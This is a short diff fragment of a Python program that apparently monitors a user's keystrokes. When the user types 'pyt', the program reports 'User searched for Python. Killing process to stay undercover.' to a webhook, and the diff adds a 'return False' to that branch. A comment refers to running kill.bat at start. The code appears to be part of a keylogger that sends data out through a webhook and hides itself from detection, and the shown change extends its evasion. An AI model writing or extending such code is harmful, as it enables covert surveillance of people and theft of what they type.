@@ -245,6 +245,7 @@ def monitor_input():
         with lock:
             if "pyt" in keystrokes.lower():
                 send_to_webhook("User searched for Python. Killing process to stay undercover.")
+                return False
 
 
 # Run kill.bat file at the start
